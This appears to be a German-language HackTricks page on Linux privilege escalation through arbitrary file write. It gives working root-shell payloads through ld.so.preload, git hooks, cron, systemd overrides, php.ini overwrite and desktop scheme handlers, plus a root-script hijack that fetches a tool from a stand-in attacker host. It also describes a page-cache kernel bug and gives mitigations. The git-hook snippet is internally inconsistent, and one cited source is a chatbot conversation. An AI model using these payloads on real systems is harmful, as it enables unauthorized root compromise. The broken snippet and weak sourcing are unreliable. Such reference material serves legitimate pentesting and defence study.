# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Diese Datei verhält sich wie die **`LD_PRELOAD`**-Umgebungsvariable, funktioniert aber auch in **SUID binaries**.\
Wenn du sie erstellen oder ändern kannst, kannst du einfach einen **Pfad zu einer Library hinzufügen, die bei jedem ausgeführten Binary geladen wird**.

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sind **Skripte**, die bei verschiedenen **Ereignissen** in einem git-Repository **ausgeführt** werden, wie wenn ein Commit erstellt wird, ein Merge... Wenn also ein **privilegiertes Skript oder Benutzer** diese Aktionen häufig ausführt und es möglich ist, in den `.git`-Ordner zu **schreiben**, kann dies für **Privesc** genutzt werden.

Zum Beispiel ist es möglich, in einem git-Repo in **`.git/hooks`** ein **Skript zu erzeugen**, sodass es immer ausgeführt wird, wenn ein neuer Commit erstellt wird:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron- & Zeitdateien

Wenn du **Cron-bezogene Dateien schreiben kannst, die root ausführt**, kannst du normalerweise beim nächsten Lauf des Jobs Codeausführung erhalten. Interessante Ziele sind:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Roots eigenes crontab in `/var/spool/cron/` oder `/var/spool/cron/crontabs/`
- `systemd` timers und die Services, die sie auslösen

Schnelle Checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typische Missbrauchswege:

- **Einen neuen root-cron-Job anhängen** an `/etc/crontab` oder eine Datei in `/etc/cron.d/`
- **Ein bereits von `run-parts` ausgeführtes Skript ersetzen**
- **Einen bestehenden timer target mit einer Backdoor versehen**, indem das Skript oder Binary geändert wird, das er startet

Minimales Cron-Payload-Beispiel:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Wenn du nur in ein von `run-parts` verwendetes cron-Verzeichnis schreiben kannst, lege stattdessen dort eine ausführbare Datei ab:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Hinweise:

- `run-parts` ignoriert normalerweise Dateinamen mit Punkten, daher sind Namen wie `backup` statt `backup.sh` besser.
- Einige Distros verwenden `anacron` oder `systemd`-Timer statt klassischem cron, aber die Missbrauchsidee ist dieselbe: **ändere, was root später ausführen wird**.

### Service- & Socket-Dateien

Wenn du **`systemd`**-Unit-Dateien oder von ihnen referenzierte Dateien schreiben kannst, kannst du möglicherweise Code-Ausführung als root erhalten, indem du die Unit neu lädst und neu startest oder indem du wartest, bis der Service-/Socket-Aktivierungspfad ausgelöst wird.

Interessante Ziele sind:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-Overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service-Skripte/Binaries, die von `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` referenziert werden
- Schreibbare `EnvironmentFile=`-Pfade, die von einem root-Service geladen werden

Schnelle Checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Gängige Missbrauchspfade:

- **Überschreibe `ExecStart=`** in einer root-owned Service-Unit, die du ändern kannst
- **Füge eine drop-in override hinzu** mit einem bösartigen `ExecStart=` und lösche zuerst den alten
- **Backdoor den Script/Binary**, der/das bereits von der Unit referenziert wird
- **Hijack einen socket-activated Service** durch Modifizieren der entsprechenden `.service`-Datei, die startet, wenn der Socket eine Verbindung empfängt

Beispiel für eine bösartige override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typischer Aktivierungsablauf:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Wenn du Services nicht selbst neu starten kannst, aber eine socket-aktivierte Unit bearbeiten darfst, musst du möglicherweise nur auf eine Client-Verbindung warten, um die Ausführung des mit einer Hintertür versehenen Services als root auszulösen.

### Eine restriktive `php.ini` überschreiben, die von einem privilegierten PHP-Sandbox verwendet wird

Einige benutzerdefinierte Daemons validieren vom Benutzer bereitgestelltes PHP, indem sie `php` mit einer **eingeschränkten `php.ini`** ausführen (zum Beispiel `disable_functions=exec,system,...`). Wenn der Sandbox-Code weiterhin **irgendeine write primitive** hat (wie `file_put_contents`) und du den **exakten `php.ini`-Pfad** erreichen kannst, den der Daemon verwendet, kannst du diese Konfiguration **überschreiben**, um die Einschränkungen aufzuheben, und danach eine zweite Payload einsenden, die mit erhöhten Rechten ausgeführt wird.

Typischer Ablauf:

1. Erste Payload überschreibt die Sandbox-Konfiguration.
2. Zweite Payload führt Code aus, jetzt da gefährliche Funktionen wieder aktiviert sind.

Minimales Beispiel (ersetze den vom Daemon verwendeten Pfad):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Wenn der Daemon als root läuft (oder mit root-owned Pfaden validiert), führt die zweite Ausführung zu einem root-Kontext. Das ist im Wesentlichen **privilege escalation via config overwrite**, wenn die sandboxed runtime immer noch Dateien schreiben kann.

### binfmt_misc

Die Datei unter `/proc/sys/fs/binfmt_misc` zeigt an, welches binary welche Art von Dateien ausführen soll. TODO: prüfe die Anforderungen, um dies auszunutzen und eine rev shell auszuführen, wenn ein gängiger Dateityp geöffnet wird.

### Overwrite schema handlers (like http: or https:)

Ein Angreifer mit Schreibrechten auf die Konfigurationsverzeichnisse eines Opfers kann leicht Dateien ersetzen oder erstellen, die das Systemverhalten ändern und dadurch unbeabsichtigte code execution auslösen. Durch das Ändern der Datei `$HOME/.config/mimeapps.list`, um HTTP- und HTTPS-URL-Handler auf eine bösartige Datei zu verweisen (z. B. durch Setzen von `x-scheme-handler/http=evil.desktop`), stellt der Angreifer sicher, dass **das Klicken auf einen beliebigen http- oder https-Link den in dieser Datei `evil.desktop` angegebenen Code ausführt**. Wenn man zum Beispiel den folgenden bösartigen Code in `evil.desktop` unter `$HOME/.local/share/applications` ablegt, führt jeder Klick auf eine externe URL den eingebetteten Befehl aus:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Für mehr Infos schau dir [**diesen Beitrag**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) an, wo es benutzt wurde, um eine echte Schwachstelle auszunutzen.

### Root executing user-writable scripts/binaries

Wenn ein privilegierter Workflow etwas wie `/bin/sh /home/username/.../script` ausführt (oder irgendein Binary innerhalb eines Verzeichnisses, das einem unprivilegierten Benutzer gehört), kannst du es hijacken:

- **Die Ausführung erkennen:** überwache Prozesse mit [pspy](https://github.com/DominicBreuker/pspy), um root dabei zu erwischen, wie es benutzerkontrollierte Pfade aufruft:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Schreibbarkeit bestätigen:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören bzw. von ihm beschreibbar sind.
- **Ziel hijacken:** Sichere das ursprüngliche Binary/Skript und platziere eine Payload, die eine SUID-Shell erstellt (oder eine andere root-Aktion ausführt), und stelle danach die Berechtigungen wieder her:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Die privilegierte Aktion auslösen** (z. B. das Drücken eines UI-Buttons, der den Helper startet). Wenn root den gehijackten Pfad erneut ausführt, hole dir die eskalierte Shell mit `./rootshell -p`.

### Nur-Page-Cache-Dateimodifikation von privilegierten Binärdateien

Einige Kernel-Bugs verändern die Datei **nicht auf der Platte**. Stattdessen erlauben sie nur die Modifikation der **Page-Cache-Kopie** einer lesbaren Datei. Wenn du eine **setuid**- oder anderweitig **von root ausgeführte** Binärdatei anvisieren kannst, kann der nächste Start vom Speicher aus vom Angreifer kontrollierte Bytes ausführen und Privilegien eskalieren, obwohl der Dateihash auf der Platte unverändert bleibt.

Das ist hilfreich, um es als eine **nur zur Laufzeit wirksame Datei-Schreibprimitive** zu betrachten:

- **Die Platte bleibt sauber**: Inode und On-Disk-Bytes ändern sich nicht
- **Der Speicher ist dirty**: Prozesse, die die gecachte Seite lesen/ausführen, bekommen den vom Angreifer modifizierten Inhalt
- **Der Effekt ist temporär**: Die Änderung verschwindet nach einem Neustart oder Cache-Eviction

Dieses Primitive liegt zwischen klassischem **arbitrary file write** und älteren **page-cache abuse**-Bugs wie Dirty COW / Dirty Pipe:

- Dirty COW verließ sich auf ein Race
- Dirty Pipe hatte Einschränkungen bei der Schreibposition
- Ein nur-Page-Cache-Primitive kann zuverlässiger sein, wenn der verwundbare Pfad direkte Writes in gecachte, dateigebundene Pages erlaubt

#### Generischer Privesc-Flow

1. Hole dir ein Kernel-Primitive, das in **dateigebundene Page-Cache-Pages** schreiben kann
2. Setze es gegen eine **lesbare privilegierte Binärdatei** oder eine andere von root ausgeführte Datei ein
3. Trigger die Ausführung **bevor** die Page aus dem Cache verdrängt wird
4. Erhalte Code Execution als root, während die Datei auf der Platte noch unverändert aussieht

Typische High-Value-Ziele:

- **setuid-root**-Binärdateien
- Helper, die von **root services** gestartet werden
- Binärdateien, die häufig aus **Containern** ausgeführt werden, die sich den Host-Kernel/Page-Cache teilen

#### AF_ALG + `splice()`-Beispielpfad

Copy Fail (CVE-2026-31431) ist ein gutes Beispiel für diese Klasse. Der verwundbare Pfad lag in der Linux Crypto Userspace API (`AF_ALG` / `algif_aead`):

- `splice()` kann Referenzen auf Page-Cache-Pages von einer lesbaren Datei in die Crypto-TX-Scatterlist verschieben
- der In-Place-`algif_aead`-Decrypt-Pfad hat Source- und Destination-Buffers wiederverwendet
- `authencesn` schrieb dann in den Destination-Tag-Bereich
- wenn dieser Bereich noch auf gesplicte, dateigebundene Pages verwies, landete der Write in der **Page Cache** der Zieldatei

Das Interessante an der Technik ist also nicht der CVE selbst, sondern das Muster:

- **dateigebundene Cache-Pages in ein Kernel-Subsystem einspeisen**
- das Subsystem dazu bringen, sie als schreibbares Output zu behandeln
- einen kleinen kontrollierten Overwrite im Speicher auslösen

Der öffentliche PoC nutzte wiederholte **4-Byte-Writes**, um `/usr/bin/su` im Speicher zu patchen und es dann auszuführen.

#### Exposure und Hunting

Wenn du diesen Bug-Typ vermutest, verlass dich nicht nur auf Integritätsprüfungen der Platte. Prüfe außerdem:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kann als Modul ladbar/entladbar sein
- `CONFIG_CRYPTO_USER_API_AEAD=y`: die Schnittstelle ist in den Kernel eingebaut
- setuid binaries sind gute Ziele, weil ein nur-page-cache-only-Patch ausreichen kann, um einen lokalen foothold in root zu verwandeln

#### Angriffsflächen-Reduzierung für den `algif_aead`-Pfad

Wenn die verwundbare Schnittstelle von einem ladbaren Modul bereitgestellt wird:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Wenn es in den Kernel kompiliert ist, meldeten einige Disclosures, dass der init-Pfad blockiert wird mit:
```bash
initcall_blacklist=algif_aead_init
```
Diese Art von Mitigation ist auch für andere Kernel-LPEs erwähnenswert: Wenn die Exploitation von einer bestimmten optionalen Schnittstelle abhängt, kann das Deaktivieren oder Blacklisten dieser Schnittstelle den Exploit-Pfad unterbrechen, noch bevor ein vollständiges Kernel-Upgrade verfügbar ist.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
